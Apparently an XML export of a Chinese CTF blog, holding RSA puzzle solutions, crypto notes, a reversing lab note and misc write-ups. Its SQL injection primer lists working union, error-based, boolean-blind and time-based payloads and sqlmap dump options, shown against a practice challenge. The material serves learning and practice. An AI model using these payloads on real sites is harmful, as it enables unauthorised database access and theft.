wall, which the doggie cannot enter;‘S’: the start point of the doggie;‘D’: the Door; or‘.’: an empty block.The input is terminated with three 0’s. This test case is not to be processed. Output 1For each test case, print in one line “YES” if the doggie can survive, or “NO” otherwise. Sample Input 123456789104 4 5S.X...X...XD....3 4 5S.X...X....D0 0 0 Sample Output 12NOYES 1011 Starship Troopers]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>HDU</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RoarCTF2019]]></title>
    <url>%2F2019%2F10%2F12%2FRoarCTF2019%2F</url>
    <content type="text"><![CDATA[这次roarCTF就简单看了看两道RSA的题目，感觉还是有新意的，现在特地记录一下 rsa123456A=(((y%x)**5)%(x%y))**2019+y**316+(y+1)/xp=next_prime(z*x*y)q=next_prime(z)A = 2683349182678714524247469512793476009861014781004924905484127480308161377768192868061561886577048646432382128960881487463427414176114486885830693959404989743229103516924432512724195654425703453612710310587164417035878308390676612592848750287387318129424195208623440294647817367740878211949147526287091298307480502897462279102572556822231669438279317474828479089719046386411971105448723910594710418093977044179949800373224354729179833393219827789389078869290217569511230868967647963089430594258815146362187250855166897553056073744582946148472068334167445499314471518357535261186318756327890016183228412253724n = 117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127c = 41971850275428383625653350824107291609587853887037624239544762751558838294718672159979929266922528917912189124713273673948051464226519605803745171340724343705832198554680196798623263806617998072496026019940476324971696928551159371970207365741517064295956376809297272541800647747885170905737868568000101029143923792003486793278197051326716680212726111099439262589341050943913401067673851885114314709706016622157285023272496793595281054074260451116213815934843317894898883215362289599366101018081513215120728297131352439066930452281829446586562062242527329672575620261776042653626411730955819001674118193293313612128 很明显，这里需要我们通过A和n的值来求出p,q的值，进而求出私钥d，最后进行解密。 我们先进行第一步，将x,y进行爆破： 1234567891011121314#coding=utf-8A = 2683349182678714524247469512793476009861014781004924905484127480308161377768192868061561886577048646432382128960881487463427414176114486885830693959404989743229103516924432512724195654425703453612710310587164417035878308390676612592848750287387318129424195208623440294647817367740878211949147526287091298307480502897462279102572556822231669438279317474828479089719046386411971105448723910594710418093977044179949800373224354729179833393219827789389078869290217569511230868967647963089430594258815146362187250855166897553056073744582946148472068334167445499314471518357535261186318756327890016183228412253724num = 0#由于有指数2019，推测，x,y的值应该不会超过1000for x in range(1,1000): for y in range(1,1000): if((x%y)!=0 and x!=0 and y!=0): num = (((y%x)**5)%(x%y))**2019+y**316+(y+1)/x if(num == A): print("x:",x) print("y:",y)#x = 2#y = 83 得到x,y之后，我们可以利用n=p*q对z的取值进行爆破: 12345678910111213141516171819202122232425#coding=utf-8import sympyimport mathn=117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127#m即是sqrt(n/166)的近似值m=sympy.nextprime(842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458029)c=86974685960185109994565885227776590430584975317324687072143606337834618757975096133503732246558545817823508491829181296701578862445122140544748432956862934052663959903364809344666885925501943806009045214347928716791730159539675944914294533623047609564608561054087106518420308176681346465904692545308790901579479104745664756811301111441543090132246542129700485721093162972711529510721321996972649182594310700996042178757282311887765329548031672904349916667094862779984235732091664623511790424370705655016549911752412395937963400908229932716593592702387850259325784109798223415344586624970470351548381110529919234353p=0q=0#从m附近查找q或pwhile(m&gt;100): if(n%m==0): p=m q=n/p print("p=") print p print("q=") print q break m=sympy.nextprime(m)#p#c#q#139916095583110895133596833227506693679306709873174024876891023355860781981175916446323044732913066880786918629089023499311703408489151181886568535621008644997971982182426706592551291084007983387911006261442519635405457077292515085160744169867410973960652081452455371451222265819051559818441257438021073941183 然后就可以求出d: 1234567891011121314151617181920212223242526272829303132333435363738394041424344# coding = utf-8def computeD(fn, e): (x, y, r) = extendedGCD(fn, e) #y maybe &lt; 0, so convert it if y &lt; 0: return fn + y return y def extendedGCD(a, b): #a*xi + b*yi = ri if b == 0: return (1, 0, a) #a*x1 + b*y1 = a x1 = 1 y1 = 0 #a*x2 + b*y2 = b x2 = 0 y2 = 1 while b != 0: q = a / b #ri = r(i-2) % r(i-1) r = a % b a = b b = r #xi = x(i-2) - q*x(i-1) x = x1 - q*x2 x1 = x2 x2 = x #yi = y(i-2) - q*y(i-1) y = y1 - q*y2 y1 = y2 y2 = y return(x1, y1, a) p = 842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458569 q = 139916095583110895133596833227506693679306709873174024876891023355860781981175916446323044732913066880786918629089023499311703408489151181886568535621008644997971982182426706592551291084007983387911006261442519635405457077292515085160744169867410973960652081452455371451222265819051559818441257438021073941183e = 65537 n = p * qfn = (p - 1) * (q - 1) d = computeD(fn, e)print("d:",d)#8599589881775512182490339390302384847126810744233969198532121090013876515514061191844004921719994842305490870513682688025890863319222633068753414378485078624510630709922513396281417153363777832648184544232199294766471900485392788050293515601012127448268872412182805907996901141107293140818104160339368182321217372234809523842344722549604286239338414176997138752498663184064331483582259621245748238876057665171100280468834141443144340932719393320666917904802256624401993129580989389345716562456345455121702090606106185465724822179950100180548721991615891176882567105125169912160252167465495939533501038099782250065 然后就可以直接解密了： 12345678910111213#coding:utf-8from Crypto.Util.number import long_to_bytes n =117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127d = 8599589881775512182490339390302384847126810744233969198532121090013876515514061191844004921719994842305490870513682688025890863319222633068753414378485078624510630709922513396281417153363777832648184544232199294766471900485392788050293515601012127448268872412182805907996901141107293140818104160339368182321217372234809523842344722549604286239338414176997138752498663184064331483582259621245748238876057665171100280468834141443144340932719393320666917904802256624401993129580989389345716562456345455121702090606106185465724822179950100180548721991615891176882567105125169912160252167465495939533501038099782250065c = 41971850275428383625653350824107291609587853887037624239544762751558838294718672159979929266922528917912189124713273673948051464226519605803745171340724343705832198554680196798623263806617998072496026019940476324971696928551159371970207365741517064295956376809297272541800647747885170905737868568000101029143923792003486793278197051326716680212726111099439262589341050943913401067673851885114314709706016622157285023272496793595281054074260451116213815934843317894898883215362289599366101018081513215120728297131352439066930452281829446586562062242527329672575620261776042653626411730955819001674118193293313612128m=pow(c,d,n)#本来这里想使用libnum的一个库来着，但是可能因为某种玄虚原因不太行，所以以后字符串的转换还是使用pycryptoprint(long_to_bytes(m))#RoarCTF&#123;wm-l1l1ll1l1l1l111ll&#125; babyRSA1234567891011121314151617181920212223242526272829import sympyimport randomdef myGetPrime(): A= getPrime(513) print(A) B=A-random.randint(1e3,1e5) print(B) return sympy.nextPrime((B!)%A)p=myGetPrime()#A1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407#B1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596#p=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140651q=myGetPrime()#A2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927#B2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026#q=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351043r=myGetPrime()#r = 237546113044253096281605033809113626736013565483812642295460095292363136024662398343531093674459197466191288877320101248913883958536348617639742373951502n=p*q*r#n=85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733c=pow(flag,e,n)#e=0x1001#c=38620963949231568493951852806812359956058522979245676395704780066879051018892175913415575431734194586035432099562300809271498658506900105389975586615280808081596988894713047252672924018208747721253303054480800386069769084714127190055658807083226038640292692679215406182331245636616583141043207599068234065117886147748321058731290102675088056205224134057176167818706519201527516421824645801542347535393294450756726281744763656819345306146716190523210020241675468#so,what is the flag? 以前没做过这种题目，现在遇到正好积累一下，关于三个合数的RSA 这里需要用到一个数学结论: wilson定理，公式表达大概如下，此处p为素数 ( p-1 )! = -1 mod p 应用：快速求阶乘 n]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入入门]]></title>
    <url>%2F2019%2F07%2F25%2FSQL%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[判断有无引号 根据字段的意义或输入的值 Name/可以输入字母或符号 Id/输入是数字 运算测试id=2-1 结果与id=1一样，说明2-1被执行，没有被引号包裹 结果与id=2一样，说明2-1被当做字符串先进行了类型转换，再执行，有引号 判断单双引号 一般来说可以直接用转义字符进行判断 ps:上面这个bugku上的成绩单一题是利用post进行传值 这里的后台就可以认为是单引号 1Select * from table1 where id = ‘$id’ Union进行注入 将两个或多个查询的结果合并到一个结果集中。 所有查询中的列数和列的顺序必须相同。数据类型必须兼容。 确定列数 方法一：union select 1,2,3…，尝试到报错之前的那个数就是列数 方法二：order by 1..…，也是尝试到报错之前的那个数就是列数 确定显示字段1234//mysql中一些基础知识1. -- 与后面的这个单引号连接在一起，无法形成有效的mysql语句2. --+ 加号与上面的区别就是多了一个空格符，-- -也有一样的效果3. # 会注释掉后面的语句 information_schema这个数据库存放的是数据库和数据表的元信息 看数据库 1select schema_name from information_schema.schemata; 看表名 1select table_name from information_schema.tables; 看列名 1select column_name from information_schema.columns; 12#格式select group_concat(column_name) from information_schema.columns where table_name=‘xxx’/0x…; 根据已知信息查数据 Select group_concat(列名) from 数据库名.表名; Sqlmap -–dbs 枚举数据库管理系统数据库 -–tables 枚举的 DBMS 数据库中的表 -T 指定 -–columns 枚举 DBMS 数据库表列 -C 指定 -–dump 转储数据库管理系统的数据库中的表项 报错注入updatexml UPDATEXML (XML_document, XPath_string, new_value); 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc； 第二个参数：XPath_string (Xpath格式的字符串)。 第三个参数：new_value，是String格式，替换查找到的符合条件的数据。 利用的关键是，updatexml第二个参数需要的是Xpath格式的字符串。如果输入的不符合Xpath格式，将会发生错误。 extractvalue extractvalue函数与updatexml函数基本相同 ，区别在于extractvalue仅有两个参数。 EXTRACTVALUE (XML_document, XPath_string); 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 。 第二个参数：XPath_string (Xpath格式的字符串)。 同样的，extractvalue第二个参数需要的是Xpath格式的字符串。如果输入的不符合Xpath格式，将会发生错误。 32.php?id=1 and extractvalue(1,concat(0x7e,(select USER()),0x7e)) 练手题：bugku 成绩单 123456#构造过程id=-1&apos; union select 1,2,3,4# //爆出字段，发现四个都有回显id=-1&apos;union select 1,2,3,database()# //得到数据库的名字skctf_flagid=-1&apos; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()# //获取表名fl4g,scid=-1&apos; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&apos;fl4g&apos;# //获取行名skctf_flagid=-1&apos; union select 1,2,3,skctf_flag from fl4g# //读取字段类容 BUGKU{Sql_INJECT0N_4813drd8hz4} 盲注 页面不会返回查询结果 页面状态只有两种，真/假 基于布尔的盲注攻击 攻击者在参数中输入类似“用户名第一个字母是a么”这样的SQL语句，根据页面结果判断真假。如果为真，继续暴力破解第二个字母。如果为假，则更改条件，“用户名第一个字母是b么”，以此类推进行基于布尔的盲注攻击。 SUBSTRING(str,pos,len)，分别代表了被截取字符串、开始截取位置、截取长度。如果没有定义len，则截取至str末尾。pos可以为负值，意思为倒数第几位。 确定长度?id=1 and (select length(group_concat(table_name)) from information_schema.tables where table_schema=database())&lt;4 确定具体内容?id=1 and (select substring(group_concat(table_name),1,1) from information_schema.tables where table_schema=database())=‘a’ 基于时间的盲注 Sleep(5) benchmark(10000000,MD5(1))]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[密码学基础]]></title>
    <url>%2F2019%2F07%2F24%2F%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[密码学概述 密码：认证以及 保证通信信息的完整性、机密性 认证： 便于授权以及管理 机密性：为了防止信息被窃听，因此需要对信息进行加密，对应的密码技术主要就是对称加密和非对称加密。 完整性：为了防止信息被篡改，因此需要对信息进行完整性校验，对应的密码技术有单向散列函数、消息认证码、数字签名。 不可否认性：为了防止发送者发布信息后否认自己发布过，因此需要证据来证明信息是否由发送者发布，对应的密码技术为数字签名。 过程： 主要思想分组密码：设M为明文，分组密码将M划分为一系列明文块Mi，通常每块包含若干字符，并且对每一块Mi都用同一个密钥Ke进行加密。M=(M1,M2,…,Mn) ，C=(C1,C2 ,…,Cn,)，其中Ci=E(Mi,Ke)，i=1,2…,n。如：DES、AESd 序列密码：将明文和密钥都划分为位(bit)或字符的序列，并且对明文序列中的每一位或字符都用密钥序列中对应的分量来加密。M=(M1,M2,…,Mn) ，Ke=(ke1,ke2,…,ken)，C=(C1,C2,…,Cn)，其中Ci=E(mi,kei)，i=1,2,…,n。 如：RC4 古典密码单表替换密码 加密：将单表替换加密也是逐个字母地加密明文。在加密时，将会按照某种无序的对应规则，并按照这个规则将明文每个字母替换而得到密文。 解密：明文和密文没有明显联系，需要两个人都拿都表来对照。 较短的密码可以观察之后直接爆破，较长的密码可以进行频率分析。 凯撒密码 又称移位密码 就是将26个字母简单的移动位置 1234abcdefghijklmnopqrstuvwxyz--&gt;右移动两个位：yzabcdefghijklmnopqrstuvwx.....其他类似 加密结果只有26种，所以可以直接爆破(用python自己写脚本) 网上有很多在线解密网站，比如：http://ctf.ssleye.com/（但这个网站有的需要收费） 多表代换密码加密后字母不再保持原来的频率。 base64 base64编码，在CTF 中比较常见，base64编码后的字符串的长度一定会被4整除，包括用作后缀的等号吧；如果明文字符数不能被3整除，余1时，1个字符转为2个，补2个等号，共4个字符；余2时，2个字符转为3个字符，补1个等号，共4个字符 base64不仅可以编码字符串，也可以编码图片， 严格来说base64不能算是一种加密，只能说是编码转换，跟ASCII码与Unicode编码一样 http://imgbase64.duoshitong.com 栗子： 1RkxBR3tCSTdfMVNDXzZhYn0= 其他常用古典密码 这个具体就自己搜搜呗 栅栏密码 培根密码 键盘密码 猪圈密码 。。。。。。 现代密码学简介 对称加密 只有一个密钥，加密和解密使用相同的密钥。需要双方协商密钥易泄露，密钥数量大难以管理 非对称加密 一般有公钥(public key)与私钥(private key)。A生成一对密钥，把公钥向其他人公开，自己保留私钥。得到公钥的B把信息加密后发给A，A再用自己的私钥进行解密 现代加密策略 一般先使用非对称加密的方式将对称加密所需的密钥进行加密交换，之后的通信可以通过对称加密进行，结合了二者的优点 RSARSA-数论基础 互质 如果两个正整数，除了1以外，没有其他公因子，我们就称这两个数是互质关系 欧拉函数 小于等于n的正整数中与与n构成互质关系的个数。对于素数p, φ(p)=p-1，对于对两个互质的数p,q， φ(pq)=φ(p)φ(q) = (p-1)(q-1) 模反元素 ab ≡ 1 (mod r), 则a,b互为模r的模反元素 贝祖等式 若设a,b是整数，则存在整数x,y，使得ax+by=gcd(a,b) 定理 ： 如果两个正整数a和n互质，那么一定可以找到整数b，使得ab-1被n整除，或者说ab被n除的余数是1 取模运算与同余的概念 如果存在一个正整数m与两个整数a,b，如果a-b能够被m整除，也就是说m|(a-b),那么a和b模m同余。记为： a \equiv b \quad mod(m) 模指数运算 模指数运算即先进行指数运算，之后再进行取模运算。 a \equiv b^c \quad mod(m) 12#python代码pow(b,c,m) 扩展欧几里得(egcd) 已知a, b求解一组x，y，使它们满足ax+by = gcd(a, b)，这是一个递归的实现方式 简单的证明过程: 设a&gt;b 当b = 0时，gcd(a,b) = a 此时 x = 1 , y = 0 当b&gt;0时 由贝祖等式可知： ​ 对于a,b的解为x1,y1，我们有： a*x_1 + b*y_1 = gcd(a,b)​ 对于b,a%b的解为x2，y2，我们有： b*x_2 + (a\%b)*y_2 = gcd(b,a\%b)由欧几里得算法可知： gcd(a,b) = gcd(b,a\%b)所以： a*x_1 + b*y_1 = b*x_2 + (a\%b)*y_2又： a\%b =a-\lfloor \frac{a}{b}\rfloor*b故： a*x_1 + b*y_1 = b*x_2 + (a-\lfloor \frac{a}{b} \rfloor*b)*y_2 \\ a*x_1 + b*y_1 = a*y_2 + (x_2-\lfloor \frac{a}{b} \rfloor*y_2)*b所以： \begin{array}{*{20}{l}} { \left\{ \begin{array}{*{20}{c}} {x_1 = y_2 }\\ {y_1 = x_2-\lfloor \frac{a}{b} \rfloor*y_2 }\\ \end{array}\right. }\\ \end{array}进行递归求解，最终可以得到x1，y1,扩展欧几里得算法一般用来求模逆，如求解 28^{-1}mod75最终的结果是: 3*75-8*28=1所以此时x1=3,y1=-8但在模75范围内，y1=75-8=67 后续利用扩展欧几里得和下列公式求解d。 e*d \equiv = 1 mod(\varphi(n)) 1234567891011121314151617181920212223242526#python实现代码：def extendedGCD(a, b): #a*xi + b*yi = ri if b == 0: return (1, 0, a) #a*x1 + b*y1 = a x1 = 1 y1 = 0 #a*x2 + b*y2 = b x2 = 0 y2 = 1 while b != 0: q = a / b #ri = r(i-2) % r(i-1) r = a % b a = b b = r #xi = x(i-2) - q*x(i-1) x = x1 - q*x2 x1 = x2 x2 = x #yi = y(i-2) - q*y(i-1) y = y1 - q*y2 y1 = y2 y2 = y return(x1, y1, a) RSA加密解密原理常见变量含义 n: 大整数，我们称之为模数(modulus) p,q:大整数的两个素因数(factor),n = p*q e,d:互为模反的两个数，其中{e,n}构成公钥，{d,n}构成私钥 c,m:c = pow(m, e, N)，得到的c即为密文,m = pow(c, d, N)，得到的m即为明文 生成密钥 选择两个大素数p和q，n = p*q 选择一个整数e，满足条件 1 < e < \varphi(n)\\ gcd(e,\varphi(n)) = 1 其中{e,n}是公钥，{d,n}是私钥 RSA安全性保障 e的选择不可以太小，否则可能会被爆破 p和q的差值尽可能大一点 d的选择不能太小，也不能太大，一般满足 d\ge n^{\frac{1}{4}} 基本的攻击方法 基本题型 变种RSARabin算法 e = 2，与RSA类似但这个函数不是单射，一个密文能解出4个明文 取两个大素数p与q，使得p≡q≡3(mod 4)(保证为奇素数) 加密： c=m^2 \quad mod( n) 解密： m^2≡c \quad mod( n) 理论基础： 二次剩余 对于式子y^2 = a \quad mod \quad p,称a是y模p的二次剩余 Euler准则 设p为一个奇素数，a是一个正整数。那么a是一个模p二次剩余当且仅当 a^{\frac{p-1}{2}} \equiv 1\ (mod\ p)证明： 充分性 假定a\equiv y^2\ (mod\ p)。由欧拉定理可知（p为素数）a^{p-1} \equiv 1(mod\ p) \\ 对于任一a \ne 0 (mod\ p)成立，所以\qquad\qquad\qquad\qquad\qquad\qquad\qquad\\ a^{\frac{p-1}{2}} \equiv (y^2)^{\frac{p-1}{2}}(mod\ p)\quad \\ \equiv y^{p-1}(mod\ p) \\ \equiv 1(mod\ p) \quad \ 必要性 假定a^{\frac{p-1}{2}}\equiv1(mod\ p)。设b是一个模p的元素。那么a\equiv b^i(mod\ p)对于\\ 某个整数i，我们有\qquad\qquad\qquad\qquad\qquad\qquad\qquad\qquad\qquad\qquad\ \ \\ a^{\frac{p-1}{2}}\equiv(b^i)^{\frac{p-1}{2}}(mod\ p) \quad \quad\\ \equiv b^{i(\frac{p-1}{2})}(mod\ p) \\ 由欧拉定理可知，此时i应该为偶数，所以a的平方根为\pm b^{\frac{i}{2}}(mod\ p )\quad\ \ p,q要求 当p \equiv 3\ (mod\ 4)时，有以下公式：\qquad\qquad \qquad\qquad\quad \qquad\qquad\quad \qquad\qquad\quad \qquad\qquad\quad\\ (\pm \ y^{\frac{p+1}{4}})^2 \equiv y^{\frac{p+1}{2}}(mod\ p) \qquad\qquad\quad \quad \\ \equiv y^{\frac{p-1}{2}}*y(mod\ p) \ \\ \equiv y(mod\ p) \qquad \ \ \ \ 中国剩余定理 用于求解同余方程组 解密 y模p的两个平方根为\pm y^{\frac{p+1}{4}}(mod\ p) \\ y模q的两个平方根为\pm y^{\frac{q+1}{4}}(mod\ q)由欧拉公式可求解p关于q的模逆以及q关于p的模逆： y_p * p+y_q*q = 1由中国剩余定理可知： r = (yp * p * mq + yq * q * mp)\ mod\ n \\ -r = n - r \qquad \qquad \qquad \qquad \qquad \qquad\\ s = (yp * p * mq - yq * q * mp)\ mod\ n \\ -s = n - s \qquad \qquad \qquad \qquad \qquad \qquad \\12345678910111213#python实现脚本#参数待定def rabin_decrypt(c, p, q, e=2): n = p * q mp = pow(c, (p + 1) / 4, p) #整除 ⽤// mq = pow(c, (q + 1) / 4, q) yp = gmpy2.invert(p, q) yq = gmpy2.invert(q, p) r = (yp * p * mq + yq * q * mp) % n rr = n - r s = (yp * p * mq - yq * q * mp) % n ss = n - s return (r, rr, s, ss) 三素数RSA 取三个素数p,q,r 计算n=p*q*r 计算欧拉函数 \varphi{n} = (p-1)*(q-1)*(r-1) 选择一个e值，满足： 1 < e < \varphi(n)\\ gcd(e,\varphi(n)) = 1 计算d值， e*d \equiv 1 \quad mod(\varphi(n)) 正确性证明 椭圆曲线椭圆曲线加密算法，即：Elliptic Curve Cryptography，简称ECC，是基于椭圆曲线数学理论实现的一种非对称加密算法。相比RSA，ECC优势是可以使用更短的密钥，来实现与RSA相当或更高的安全。据研究，160位ECC加密安全性相当于1024位RSA加密，210位ECC加密安全性相当于2048位RSA加密。 椭圆曲线的一般方程为 y^2 = x^3+ax^2+b^2+c 判别式为 \Delta (E) = -4a^3c+a^2b^2-4b^3-27c^2+18abc \neq 0比如下面这个图： 密码学中用到的椭圆曲线方程一般限定为 y^2=x^3+ax+b，其中\Delta(E)=4a^3+27b^2 \neq 0 定义椭圆曲线的运算规则 加法 过曲线上的两点A、B画一条直线，找到直线与椭圆曲线的交点，交点关于x轴对称位置的点，定义为A+B，即为加法。如下图所示：A + B = C 二倍运算 此时上述直线与曲线相切，在这种情况下，将椭圆曲线在A点的切线，与椭圆曲线的交点，交点关于x轴对称位置的点，定义为A + A，即2A，即为二倍运算。 正负取反A与-A,坐标相当于关于x轴对称 无穷远为单位元x A+（-A）=O 实数的椭圆曲线椭圆曲线加密解密原理由上述所定义的运算，我们知道，当给定一个点G时，已知一个数k求kG并不困难，但是已知kG我们想要求k却是非常困难。所以我们可以将k当作私钥，K=kG为公钥， 加密过程：选择一个随机数r，将消息M生成密文C，该密文是一个点对C={rG,M+rK} 解密过程：M+rK-k(rG)=M 椭圆曲线签名算法原理 私钥签名： 选择一个随机数r，计算点rG，G(x,y) 根据随机数r、消息M的hash值、私钥k，计算sig = (h+kx)/r (ps:有限域中的除运算都是求逆) 将消息M、和签名{rG,sig} 公钥验证签名： 接收方收到消息M、以及签名{rG, s} 根据消息求哈希h 使用发送方公钥K计算:hG/s+xK/s =rG 为什么需要hash???]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HITCON-train]]></title>
    <url>%2F2019%2F07%2F11%2FHITCON-train%2F</url>
    <content type="text"><![CDATA[lab1先看看保护机制 打开了部分可读，而就是可以进行溢出覆盖，打开了栈溢出保护，而且NX打开，不可执行，地址随机化没有打开 现在可以用ida打开看看文件，是32位的，所以就可以直接在ida.exe里面打开 找到mian函数，反编译以下： 看到关键函数get_flag(): 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374v67 = __readgsdword(0x14u); v54 = 'y_oD'; v55 = 'k_uo'; v56 = '_won'; v57 = '_yhw'; v58 = 't_ym'; v59 = 'mmae'; v60 = '_eta'; v61 = 'narO'; v62 = 'i_eg'; v63 = 'os_s'; v64 = 'gna_'; v65 = '??yr'; v66 = '?'; v5 = 7; v6 = 59; v7 = 25; v8 = 2; v9 = 11; v10 = 16; v11 = 61; v12 = 30; v13 = 9; v14 = 8; v15 = 18; v16 = 45; v17 = 40; v18 = 89; v19 = 10; v20 = 0; v21 = 30; v22 = 22; v23 = 0; v24 = 4; v25 = 85; v26 = 22; v27 = 8; v28 = 31; v29 = 7; v30 = 1; v31 = 9; v32 = 0; v33 = 126; v34 = 28; v35 = 62; v36 = 10; v37 = 30; v38 = 11; v39 = 107; v40 = 4; v41 = 66; v42 = 60; v43 = 44; v44 = 91; v45 = 49; v46 = 85; v47 = 2; v48 = 30; v49 = 33; v50 = 16; v51 = 76; v52 = 30; v53 = 66; fd = open("/dev/urandom", 0); read(fd, &amp;buf, 4u); printf("Give me maigc :"); __isoc99_scanf("%d", &amp;v2); if ( buf == v2 ) &#123; for ( i = 0; i &lt;= 0x30; ++i ) putchar((char)(*(&amp;v5 + i) ^ *((_BYTE *)&amp;v54 + i))); &#125; return __readgsdword(0x14u) ^ v67;&#125; 根据这个可以直接进行逆向： 1234567#-*-encoding=utf-8-*-K = "Do_you_know_why_my_teammate_Orange_is_so_angry???"C = [7, 59, 25, 2, 11, 16, 61, 30, 9, 8, 18, 45, 40, 89, 10, 0, 30, 22, 0, 4, 85, 22, 8, 31, 7, 1, 9, 0, 126, 28, 62, 10, 30, 11, 107, 4, 66, 60, 44, 91, 49, 85, 2, 30, 33, 16, 76, 30, 66]print("sizeof(C):",len(C))print("sizeof(K):",len(K))for i in range(len(K)): print(chr(C[i]^ord(K[i])),end="") lab2]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python推荐工具]]></title>
    <url>%2F2019%2F05%2F19%2Fpython%E6%8E%A8%E8%8D%90%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[Anaconda介绍Anaconda就是可以便捷获取包且对包能够进行管理，同时对环境可以统一管理的发行版本。Anaconda包含了conda、Python在内的超过180个科学包及其依赖项。 特点 开源 安装过程简单 高性能使用Python和R语言 免费的社区支持 独立的环境依赖，使得诸多比较难装的库可以直接安装 安装 下载链接： https://www.anaconda.com/ Python2.7还有不到一年就要退休了，所以如果你没有什么特殊的工作要求，python3.7就足够满足所有要求 下载下来，点击安装，顺着流程走： 到这一步可以不用选择配置环境变量，以便后面安装什么东西冲突，会出现奇怪的bug 然后一直安装到这,点击install vscode，一个比较好用的编辑器 安装好后，安装一个插件，就差不多可以直接用了 pycharm安装 下载链接：https://www.jetbrains.com/zh/pycharm/specials/pycharm/pycharm.html?utm_source=baidu&amp;utm_medium=cpc&amp;utm_campaign=cn-bai-br-pycharm-ex-pc&amp;utm_content=pycharm-pure&amp;utm_term=pycharm&amp;gclid=CIesutOLqOICFQMpvAodTg4HGA&amp;gclsrc=ds 一路next就行 需要激活的地方停一下 申请学生账号 点击buy Pycharm 填信息 然后等着确认一下就行 之后就可以用了 pycharm中使用anaconda部署python环境 参考网站：https://www.cnblogs.com/pejsidney/p/9216470.html]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>软件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019_ISCC]]></title>
    <url>%2F2019%2F05%2F19%2F2019-ISCC-Misc%2F</url>
    <content type="text"><![CDATA[隐藏的信息打开文件是一堆八进制码 10126 062 0126 0163 0142 0103 0102 0153 0142 062 065 0154 0111 0121 0157 0113 0111 0105 0132 0163 0131 0127 0143 066 0111 0105 0154 0124 0121 060 0116 067 0124 0152 0102 0146 0115 0107 065 0154 0130 062 0116 0150 0142 0154 071 0172 0144 0104 0102 0167 0130 063 0153 0167 0144 0130 060 0113 直接用python转成十进制，然后变为ASCII字符,脚本如下： 12345678910import re#openwith open('message.txt', 'r') as f1: s1 = f1.read() s1 = re.split(' ',s1) for i in s1[0:-1]: print(chr(int(i,8)),end='') f1.close()#V2VsbCBkb25lIQoKIEZsYWc6IElTQ0N7TjBfMG5lX2Nhbl9zdDBwX3kwdX0K#base64解码：ISCC&#123;N0_0ne_can_st0p_y0u&#125; Welcome下载得到一个名为zip的文件，不可打开，看看文件类型 是一个压缩包文件，然后可以解压出50张二维码，发现一个jpg为其他都是png，查看文件二进制信息即可得到flag 1#flag&#123;15cC9012&#125; 提交格式应该是 15cC9012 碎纸机下载得到一个压缩包文件，可以直接解压，得到一个图片 真的是一个碎纸机，先看看文件类型 用binwalk查看一下是否图片里藏有其他文件： 用binwalk -e 平平无奇的碎纸机.jpg分离出文件，得到一些拼图和一个文档 